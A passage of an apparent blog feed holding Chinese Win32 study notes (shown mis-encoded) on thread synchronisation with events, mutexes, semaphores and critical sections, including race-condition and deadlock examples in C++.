c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function">DWORD WINAPI <span class="title">ThreadProc1</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line"> &#123;</span><br><span class="line"> WaitForSingleObject(a_Event,INFINITE);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;This is a Producer Create A+++++\n&quot;</span>);</span><br><span class="line"> Sleep(<span class="number">500</span>);</span><br><span class="line"> SetEvent(b_Event);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>åœ¨çº¿ç¨‹1ä¸­å°†äº‹ä»¶Bè®¾ç½®ä¸ºå·²é€šçŸ¥çŠ¶æ€</p></li><li><p>åˆ›å»ºçº¿ç¨‹2</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc2</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">WaitForSingleObject(b_Event,INFINITE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This is a Consumer Destroy A-----\n&quot;</span>);</span><br><span class="line">Sleep(<span class="number">500</span>);</span><br><span class="line">SetEvent(a_Event);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ç»“æŸæ—¶å°†çº¿ç¨‹1è®¾ç½®ä¸ºå·²é€šçŸ¥çŠ¶æ€</p></li></ul><p>è¿™æ ·å°±å¯ä»¥ä½¿ä¸¤ä¸ªçº¿ç¨‹äº¤æ›¿è¿›è¡Œï¼Œä¸”å……åˆ†åˆ©ç”¨äº†CPU</p><h3 id="äº’æ–¥ä½“"><a href="#äº’æ–¥ä½“" class="headerlink" title="äº’æ–¥ä½“"></a>äº’æ–¥ä½“</h3><h4 id="åˆ›å»ºäº’æ–¥ä½“"><a href="#åˆ›å»ºäº’æ–¥ä½“" class="headerlink" title="åˆ›å»ºäº’æ–¥ä½“"></a>åˆ›å»ºäº’æ–¥ä½“</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateMutexA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpMutexAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL                  bInitialOwner,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR                lpName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>dwDesiredAccess</strong></p><p>äº’æ–¥ä½“å±äºå†…æ ¸å¯¹è±¡ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è®¾ç½®ä¸ºNULL</p></li><li><p><strong>bInheritHandle</strong></p><p>å¦‚æœæ­¤å€¼ä¸º<strong>TRUE</strong>ï¼Œå¹¶ä¸”è°ƒç”¨æ–¹åˆ›å»ºäº†äº’æ–¥é‡ï¼Œåˆ™è°ƒç”¨çº¿ç¨‹å°†è·å¾—è¯¥äº’æ–¥å¯¹è±¡çš„åˆå§‹æ‰€æœ‰æƒã€‚å¦åˆ™ï¼Œè°ƒç”¨çº¿ç¨‹å°†æ— æ³•è·å¾—è¯¥äº’æ–¥é”çš„æ‰€æœ‰æƒã€‚</p></li><li><p>lpName</p><p>åˆ›å»ºçš„äº’æ–¥ä½“çš„åç§°ï¼Œå¦‚æœåœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­ä½¿ç”¨å¯ä»¥ä¸ºNULLï¼Œå¦‚æœåœ¨ä¸åŒè¿›ç¨‹ä¸­ä½¿ç”¨éœ€è¦èµ‹äºˆåç§°</p></li></ul><h4 id="åœ¨å…¶ä»–è¿›ç¨‹ä¸­æ‰“å¼€äº’æ–¥ä½“"><a href="#åœ¨å…¶ä»–è¿›ç¨‹ä¸­æ‰“å¼€äº’æ–¥ä½“" class="headerlink" title="åœ¨å…¶ä»–è¿›ç¨‹ä¸­æ‰“å¼€äº’æ–¥ä½“"></a>åœ¨å…¶ä»–è¿›ç¨‹ä¸­æ‰“å¼€äº’æ–¥ä½“</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenMutexW</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL    bInheritHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR lpName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>dwDesiredAccess</strong></p><p>äº’æ–¥ä½“å±äºå†…æ ¸å¯¹è±¡ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è®¾ç½®ä¸ºNULL</p></li><li><p><strong>bInheritHandle</strong></p><p>å¦‚æœæ­¤å€¼ä¸º<strong>TRUE</strong>ï¼Œåˆ™æ­¤è¿›ç¨‹åˆ›å»ºçš„è¿›ç¨‹å°†ç»§æ‰¿è¯¥å¥æŸ„ã€‚å¦åˆ™ï¼Œè¿›ç¨‹å°†ä¸ä¼šç»§æ‰¿æ­¤å¥æŸ„</p></li><li><p><strong>lpName</strong></p><p>éœ€è¦æ‰“å¼€çš„äº’æ–¥ä½“çš„åç§°</p></li></ul><h4 id="é‡Šæ”¾æŒ‡å®šäº’æ–¥å¯¹è±¡çš„æ‰€æœ‰æƒ"><a href="#é‡Šæ”¾æŒ‡å®šäº’æ–¥å¯¹è±¡çš„æ‰€æœ‰æƒ" class="headerlink" title="é‡Šæ”¾æŒ‡å®šäº’æ–¥å¯¹è±¡çš„æ‰€æœ‰æƒ"></a>é‡Šæ”¾æŒ‡å®šäº’æ–¥å¯¹è±¡çš„æ‰€æœ‰æƒ</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ReleaseMutex</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hMutex</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>hMutex</strong></p><p>äº’æ–¥å¯¹è±¡çš„å¥æŸ„ã€‚è¯¥ <strong>CreateMutex</strong>æˆ–<strong>OpenMutex</strong>å‡½æ•°è¿”å›æ­¤å¥æŸ„ã€‚</p></li></ul><h3 id="ä¿¡å·é‡"><a href="#ä¿¡å·é‡" class="headerlink" title="ä¿¡å·é‡"></a>ä¿¡å·é‡</h3><h4 id="åˆ›å»ºä¿¡å·é‡"><a href="#åˆ›å»ºä¿¡å·é‡" class="headerlink" title="åˆ›å»ºä¿¡å·é‡"></a>åˆ›å»ºä¿¡å·é‡</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateSemaphoreW</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpSemaphoreAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  LONG                  lInitialCount,</span></span></span><br><span class="line"><span class="function"><span class="params">  LONG                  lMaximumCount,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR               lpName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>lpSemaphoreAttributes</strong></p><p>äº’æ–¥ä½“å±äºå†…æ ¸å¯¹è±¡ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è®¾ç½®ä¸ºNULL</p></li><li><p><strong>lInitialCount</strong></p><p>ä¿¡å·é‡å¯¹è±¡çš„åˆå§‹è®¡æ•°ã€‚æ­¤å€¼å¿…é¡»å¤§äºæˆ–ç­‰äºé›¶ä¸”å°äºæˆ–ç­‰äº<em>lMaximumCount</em>ã€‚å½“ä¿¡å·é‡çš„è®¡æ•°å¤§äºé›¶æ—¶ï¼Œå°†å‘å‡ºä¿¡å·çŠ¶æ€ï¼›åœ¨ä¿¡å·é‡ä¸ºé›¶æ—¶ï¼Œå°†ä¸å‘å‡ºä¿¡å·çŠ¶æ€ã€‚æ¯å½“ç­‰å¾…å‡½æ•°é‡Šæ”¾ç­‰å¾…ä¿¡å·é‡çš„çº¿ç¨‹æ—¶ï¼Œè®¡æ•°å°±ä¼šå‡å°‘ä¸€ã€‚é€šè¿‡è°ƒç”¨ReleaseSemaphoreå‡½æ•°å°†è®¡æ•°å¢åŠ æŒ‡å®šçš„æ•°é‡ ã€‚</p></li><li><p><strong>lMaximumCount</strong></p><p>ä¿¡å·é‡å¯¹è±¡çš„æœ€å¤§è®¡æ•°ã€‚è¯¥å€¼å¿…é¡»å¤§äºé›¶ã€‚</p></li><li><p><strong>lpName</strong></p><p>åˆ›å»ºçš„ä¿¡å·é‡åç§°ï¼Œå¯ä»¥NULL</p></li></ul><h4 id="é‡Šæ”¾ç­‰å¾…ä¿¡å·é‡"><a href="#é‡Šæ”¾ç­‰å¾…ä¿¡å·é‡" class="headerlink" title="é‡Šæ”¾ç­‰å¾…ä¿¡å·é‡"></a>é‡Šæ”¾ç­‰å¾…ä¿¡å·é‡</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ReleaseSemaphore</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hSemaphore,</span></span></span><br><span class="line"><span class="function"><span class="params">  LONG   lReleaseCount,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPLONG lpPreviousCount</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>hSemaphore</strong></p><p>ä¿¡å·é‡å¯¹è±¡çš„å¥æŸ„ã€‚è¯¥ CreateSemaphoreæˆ– OpenSemaphoreå‡½æ•°è¿”å›è¯¥å¥æŸ„ã€‚</p></li><li><p><strong>lReleaseCount</strong></p><p>ä¿¡å·é‡å¯¹è±¡çš„å½“å‰è®¡æ•°è¦å¢åŠ çš„æ•°é‡ã€‚è¯¥å€¼å¿…é¡»å¤§äºé›¶ã€‚å¦‚æœæŒ‡å®šçš„æ•°é‡å°†å¯¼è‡´ä¿¡å·é‡çš„è®¡æ•°è¶…è¿‡åˆ›å»ºä¿¡å·é‡æ—¶æŒ‡å®šçš„æœ€å¤§è®¡æ•°ï¼Œåˆ™è¯¥è®¡æ•°ä¸ä¼šæ›´æ”¹ï¼Œå‡½æ•°å°†è¿”å›<strong>FALSE</strong>ã€‚</p></li><li><p><strong>lpPreviousCount</strong></p><p>æŒ‡å‘å˜é‡çš„æŒ‡é’ˆï¼Œä»¥æ¥æ”¶ä¿¡å·é‡çš„å…ˆå‰è®¡æ•°ã€‚å¦‚æœä¸éœ€è¦ä¸Šä¸€ä¸ªè®¡æ•°ï¼Œåˆ™æ­¤å‚æ•°å¯ä»¥ä¸º<strong>NULL</strong>ã€‚</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h3 id=&quot;å¯¹è±¡&quot;&gt;&lt;a href=&quot;#å¯¹è±¡&quot; class=&quot;headerlink&quot; title=&quot;å¯¹è±¡&quot;&gt;&lt;/a&gt;å¯¹è±¡&lt;/h3&gt;&lt;h4 id=&quot;çŠ¶æ€&quot;&gt;&lt;a href=&quot;#çŠ¶æ€&quot; class=&quot;headerlink&quot; title=&quot;çŠ¶æ€</summary>
      
    
    
    
    <category term="Windows" scheme="http://example.com/categories/Windows/"/>
    
    <category term="win32" scheme="http://example.com/categories/Windows/win32/"/>
    
    <category term="çº¿ç¨‹" scheme="http://example.com/categories/Windows/win32/%E7%BA%BF%E7%A8%8B/"/>
    
    
    <category term="ç¼–ç¨‹" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>ğŸ¦Win32å­¦ä¹ è®°å½•-3(çº¿ç¨‹æ§åˆ¶ä¸ä¸´ç•ŒåŒº)</title>
    <link href="http://example.com/2020/11/05/windows/Win32-3/"/>
    <id>http://example.com/2020/11/05/windows/Win32-3/</id>
    <published>2020-11-05T13:20:56.052Z</published>
    <updated>2021-02-05T06:29:50.382Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="å¤šçº¿ç¨‹ä¹‹é—´çš„èµ„æºæŠ¢å é—®é¢˜"><a href="#å¤šçº¿ç¨‹ä¹‹é—´çš„èµ„æºæŠ¢å é—®é¢˜" class="headerlink" title="å¤šçº¿ç¨‹ä¹‹é—´çš„èµ„æºæŠ¢å é—®é¢˜"></a>å¤šçº¿ç¨‹ä¹‹é—´çš„èµ„æºæŠ¢å é—®é¢˜</h3><p>â€‹        å½“å¤šä¸ªçº¿ç¨‹ä½¿ç”¨åŒä¸€ä¸ªèµ„æºæ—¶ï¼Œä¼šå‡ºç°èµ„æºæŠ¢å é—®é¢˜</p><h4 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h4><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201103194832013.png" style="zoom:80%;" /><p>â€‹        è¿™ä¸ªç¨‹åºåŠŸèƒ½ä¸ºå‘æ–‡æœ¬æ¡†ä¸­åŠ æ•°å­—ï¼Œæ¯ä¸€æ¬¡åŠ ä¸€ï¼Œä¸¤ä¸ªçº¿ç¨‹åŒæ—¶åŠ ï¼Œæ¯ä¸€ä¸ªçº¿ç¨‹æœ€å¤šåŠ åˆ°1000ï¼Œå½“ä¸¤ä¸ªçº¿ç¨‹ç»“æŸåï¼Œæ–‡æœ¬æ¡†ä¸­çš„æœŸæœ›å€¼ä¸º2000ã€‚ä½†æ˜¯å½“åŒæ—¶æŒ‰ä¸‹ä¸¤ä¸ªæŒ‰é’®ç­‰å¾…çº¿ç¨‹ç»“æŸåï¼Œæ–‡æœ¬æ¡†ä¸­çš„ç»“æœå´ä¸æœŸæœ›å€¼æœ‰åå·®</p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201103195026242.png" style="zoom:80%;" /><ul><li><p>çº¿ç¨‹å‡½æ•°1 ä»£ç </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc1</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR szBuffer[<span class="number">10</span>];</span><br><span class="line">DWORD dwIndex = <span class="number">0</span>;</span><br><span class="line">DWORD dwCount;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (dwIndex &lt; <span class="number">1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">GetWindowText(hEDIT, szBuffer, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">int</span> check = <span class="built_in">sscanf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, &amp;dwCount);</span><br><span class="line">dwCount++;</span><br><span class="line"><span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, dwCount);</span><br><span class="line">SetWindowText(hEDIT, szBuffer);</span><br><span class="line">dwIndex++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>çº¿ç¨‹å‡½æ•°2 ä»£ç </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc2</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR szBuffer[<span class="number">10</span>];</span><br><span class="line">DWORD dwIndex = <span class="number">0</span>;</span><br><span class="line">DWORD dwCount;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (dwIndex &lt; <span class="number">1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">GetWindowText(hEDIT, szBuffer, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">int</span> check = <span class="built_in">sscanf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, &amp;dwCount);</span><br><span class="line">dwCount++;</span><br><span class="line"><span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, dwCount);</span><br><span class="line">SetWindowText(hEDIT, szBuffer);</span><br><span class="line">dwIndex++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸¤ä¸ªçº¿ç¨‹å‡½æ•°æ­¥éª¤å¦‚ä¸‹</p><ol><li>æ–‡æœ¬æ¡†ä¸­å–å€¼</li><li>å­—ç¬¦ä¸² -&gt; æ•°å­—</li><li>æ•°å­—è‡ªåŠ 1</li><li>æ•°å­— -&gt; å­—ç¬¦ä¸²</li><li>æ”¾å›æ–‡æœ¬æ¡†ä¸­</li></ol></li></ul><h4 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h4><p>  â€‹        åœ¨windowsç³»ç»Ÿä¸­ï¼Œä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨ä¸€ä¸ªCUP,ä½†æ˜¯ç”µè„‘ä¸­çš„CPUæœ‰é™ï¼Œè€Œç”µè„‘ä¸­åˆæœ‰å¾ˆå¤šè¿›ç¨‹ï¼Œæ¯ä¸€ä¸ªè¿›ç¨‹ä¸­åˆå­˜åœ¨å¾ˆå¤šçº¿ç¨‹ï¼Œæ‰€ä»¥å¼€å‘äººå‘˜åœ¨è®¾è®¡çš„æ—¶å€™è§„å®šæ¯ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨CPUçš„æ—¶é—´ä¸º20msï¼Œå½“ä¸€ä¸ªçº¿ç¨‹20msçš„æ—¶é—´ç”¨å°½ï¼Œåªæœ‰ç­‰å¾…ä¸‹æ¬¡ä¸ºä»–åˆ†é…æ—¶é—´æ—¶æ‰å¯ä»¥ç»§ç»­å·¥ä½œã€‚æ‰€ä»¥å½“ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶æ“ä½œä¸€ä¸ªå…¨å±€å˜é‡æ—¶å°±ä¼šå‡ºç°é—®é¢˜ã€‚</p><p>  <img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201105194833216.png" style="zoom: 67%;" /><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201105195059526.png"></p><h5 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h5><p>â€‹        Windowsè®¾è®¡å‡ºäº†ä¸´ç•ŒåŒºæ¥è§£å†³çº¿ç¨‹æŠ¢å èµ„æºçš„é—®é¢˜</p><p>â€‹        å½“å¤šä¸ªè®¾è®¡ç¨‹åºå¤šä¸ªçº¿ç¨‹éƒ½æ¶‰åŠåˆ°æŸä¸ªå…¨å±€å˜é‡æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä¸´ç•ŒåŒºæ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä¸´ç•ŒåŒºå¯ä»¥ç†è§£ä¸ºç»™è¿™ä¸ªå…¨å±€å˜é‡å‡å®šäº†ä¸€ä¸ªä»¤ç‰Œï¼Œè¿™ä¸ªä»¤ç‰Œåœ¨ç¨‹åºä¸­åªæœ‰ä¸ªå—ï¼Œåªæœ‰æ‹¿åˆ°ä»¤ç‰Œçš„äººæ‰å¯ä»¥å¯¹å…¨å±€å˜é‡è¿›è¡Œæ“ä½œã€‚</p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201105203720477.png" style="zoom:67%;" /><p>â€‹        å°†ä¸Šé¢çš„çº¿ç¨‹å‡½æ•°åšå¦‚ä¸‹ä¸‹ä¿®æ”¹ï¼Œå°±å¯ä»¥è§£å†³å¤šçº¿ç¨‹ä½¿ç”¨åŒä¸€ä¸ªå…¨å±€å˜é‡çš„é—®é¢˜ã€‚</p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201105204003677.png" style="zoom:80%;" /><h4 id="ä¸´ç•ŒåŒºç»“æ„ä½“éƒ¨åˆ†æˆå‘˜è§£é‡Š"><a href="#ä¸´ç•ŒåŒºç»“æ„ä½“éƒ¨åˆ†æˆå‘˜è§£é‡Š" class="headerlink" title="ä¸´ç•ŒåŒºç»“æ„ä½“éƒ¨åˆ†æˆå‘˜è§£é‡Š"></a>ä¸´ç•ŒåŒºç»“æ„ä½“éƒ¨åˆ†æˆå‘˜è§£é‡Š</h4><p>ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_CRITICAL_SECTION</span> &#123;</span></span><br><span class="line">    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//  The following three fields control entering and exiting the critical</span></span><br><span class="line">    <span class="comment">//  section for the resource</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    LONG LockCount;</span><br><span class="line">    LONG RecursionCount;</span><br><span class="line">    HANDLE OwningThread;        <span class="comment">// from the thread&#x27;s ClientId-&gt;UniqueThread</span></span><br><span class="line">    HANDLE LockSemaphore;</span><br><span class="line">    ULONG_PTR SpinCount;        <span class="comment">// force size on 64-bit systems when packed</span></span><br><span class="line">&#125; RTL_CRITICAL_SECTION, *PRTL_CRITICAL_SECTION;</span><br></pre></td></tr></table></figure><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201105204447624.png" style="zoom:80%;" /><h3 id="æ­»é”"><a href="#æ­»é”" class="headerlink" title="æ­»é”"></a>æ­»é”</h3><p>â€‹        ä¸´ç•ŒåŒºä½¿ç”¨ä¸å½“å¯èƒ½ä¼šé€ æˆæ­»é”ï¼Œå½“å®šä¹‰ä¸¤ä¸ªé”åŠä»¥ä¸Šä½¿ç”¨éœ€è¦æ ¼å¤–å°å¿ƒï¼Œå¦åˆ™ç¨‹åºå°±å¯èƒ½é€ æˆæ­»é”ã€‚ä¸‹å›¾å°±æ˜¯æ­»é”çš„åŸºæœ¬åŸç†ï¼Œå½“ä½¿ç”¨ä¸´ç•ŒåŒºæ—¶ï¼Œåº”è¯¥å°½é‡æ³¨æ„å°†ä½¿ç”¨é”çš„ä½¿ç”¨é¡ºåºï¼Œç»é‡å°†é”çš„ä½¿ç”¨é¡ºåºå˜æˆä¸€æ ·çš„ã€‚</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201105210326244.png"></p><h4 id="è¯•å†™æ­»é”ç¨‹åº"><a href="#è¯•å†™æ­»é”ç¨‹åº" class="headerlink" title="è¯•å†™æ­»é”ç¨‹åº"></a>è¯•å†™æ­»é”ç¨‹åº</h4><p>â€‹         æ­»é”ç¨‹åºæ²¡æœ‰ä»»ä½•ä½œç”¨ï¼Œä½†æ˜¯å¯ä»¥åŠ æ·±å¯¹ä¸´ç•ŒåŒºçš„ç†è§£ï¼Œä¸”æ‰€è°“çš„æ­»é”ç¨‹åºåªæ˜¯é€»è¾‘ä¸Šçš„ï¼Œå½“å†™å‡ºæ¥åä¹Ÿä¸ä¸€å®šä¼šç«‹åˆ»ç”Ÿæ•ˆã€‚</p><ul><li><p>çº¿ç¨‹1ä»£ç </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc1</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR szBuffer[<span class="number">10</span>];</span><br><span class="line">DWORD dwIndex = <span class="number">0</span>;</span><br><span class="line">DWORD dwCount;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (dwIndex &lt; <span class="number">1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">EnterCriticalSection(&amp;cs1);<span class="comment">//é”1</span></span><br><span class="line">***********å®¹æ˜“äº§ç”Ÿæ­»é”çš„ä½ç½®***********</span><br><span class="line">EnterCriticalSection(&amp;cs2);<span class="comment">//é”2</span></span><br><span class="line"></span><br><span class="line">GetWindowText(hEDIT, szBuffer, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">int</span> check = <span class="built_in">sscanf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, &amp;dwCount);</span><br><span class="line">dwCount++;</span><br><span class="line"><span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, dwCount);</span><br><span class="line">SetWindowText(hEDIT, szBuffer);</span><br><span class="line">dwIndex++;</span><br><span class="line">LeaveCriticalSection(&amp;cs2);</span><br><span class="line"></span><br><span class="line">LeaveCriticalSection(&amp;cs1);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>çº¿ç¨‹2ä»£ç </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc2</span><span 